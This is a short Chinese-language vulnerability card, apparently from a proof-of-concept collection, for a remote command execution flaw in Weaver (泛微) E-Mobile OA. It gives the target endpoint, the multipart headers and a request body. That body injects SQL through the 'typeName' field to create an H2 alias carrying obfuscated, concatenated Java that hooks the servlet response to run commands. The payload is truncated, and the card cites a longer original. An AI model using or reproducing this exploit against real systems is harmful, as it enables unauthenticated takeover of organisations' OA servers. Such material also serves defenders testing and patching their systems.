# 泛微E-Mobile前台远程命令执行漏洞

- **系统**：泛微OA　|　**类型**：命令执行　|　**CVE**：—
- **请求**：`POST /messageType.do HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data;boundary=----WebKitFormBoundaryTm8YXcJey…`

**请求体 / payload**
```
------WebKitFormBoundaryTm8YXcJeyKDClbU7
Content-Disposition: form-data; name="method"
create
------WebKitFormBoundaryTm8YXcJeyKDClbU7
Content-Disposition: form-data; name="typeName"
1';CREATE ALIAS if not exists MzSNqKsZTagm AS CONCAT('void e(String cmd) throws java.la','ng.Exception{','Object curren','tRequest = Thre','ad.currentT','hread().getConte','xtClass','Loader().loadC','lass("com.caucho.server.dispatch.ServletInvocation").getMet','hod("getContextRequest").inv','oke(null);java.la','ng.reflect.Field _responseF = currentRequest.getCl','ass().getSuperc','lass().getDeclar','edField("_resp…（脚本共 1132 字，完整版见原文）
```
- **预期**：200　|　system